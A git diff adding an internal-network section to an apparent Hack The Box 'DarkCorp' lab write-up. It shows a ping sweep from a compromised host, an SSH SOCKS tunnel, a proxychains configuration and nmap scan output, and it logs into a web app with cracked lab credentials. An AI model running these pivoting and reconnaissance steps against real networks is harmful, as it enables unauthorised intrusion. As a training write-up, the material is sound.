@@ -424,3 +424,111 @@ Hash.Target......: hashes.txt
 ```
 
 Credential found: `victor.r`/`victor1gustavo@#`
+
+## 4. Internal network
+
+### 4.1. Discovery
+
+Recall internal network found on `/etc/hosts`:
+
+```sh
+172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
+172.16.20.3 drip.darkcorp.htb
+```
+
+Ping sweep another host `172.16.20.2` on the internal network:
+
+```console
+postgres@drip:~$ export SUBNET=172.16.20
+postgres@drip:~$ for i in $(seq 254); do ping $SUBNET.$i -c1 -W1 & done | grep from
+64 bytes from 172.16.20.3: icmp_seq=1 ttl=64 time=0.013 ms
+64 bytes from 172.16.20.1: icmp_seq=1 ttl=128 time=0.577 ms
+64 bytes from 172.16.20.2: icmp_seq=1 ttl=128 time=3.41 ms
+````
+
+Establish SSH dynamic tunnel for SOCKS proxy:
+
+```
+ssh -f -N -i id_ed25519 -D 0.0.0.0:1080 postgres@drip.htb
+```
+
+Configure proxychains `/etc/proxychains4.conf`:
+
+```sh
+⋮
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4        127.0.0.1 9050
+socks5 127.0.0.1 1080
+```
+
+nmap over proxychains:
+
+> [!Tip]
+>
+> `-sT` TCP Connect() mode is required for nmap over proxychains
+
+```console
+root@kali:~# proxychains nmap -Pn -sTCV 172.16.20.2
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 10:36 +08
+⋮
+Nmap scan report for 172.16.20.2
+Host is up (0.042s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5000/tcp open  http          Microsoft IIS httpd 10.0
+|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
+| http-ntlm-info:
+|   Target_Name: darkcorp
+|   NetBIOS_Domain_Name: darkcorp
+|   NetBIOS_Computer_Name: WEB-01
+|   DNS_Domain_Name: darkcorp.htb
+|   DNS_Computer_Name: WEB-01.darkcorp.htb
+|   DNS_Tree_Name: darkcorp.htb
+|_  Product_Version: 10.0.20348
+|_http-server-header: Microsoft-IIS/10.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|   Negotiate
+|_  NTLM
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2025-09-14T02:14:57
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+|_clock-skew: mean: -25m47s, deviation: 0s, median: -25m47s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.47 seconds
+```
+
+### 4.2. Web application at `5000`
+
+The web app uses basic authentication, login with `victor`'s credential:
+
+![](https://github.com/user-attachments/assets/4cdfdd14-9d3f-4854-a935-da3c97e40389)
+
+![](https://github.com/user-attachments/assets/84d46744-1e51-48c9-b720-046be818b49c)
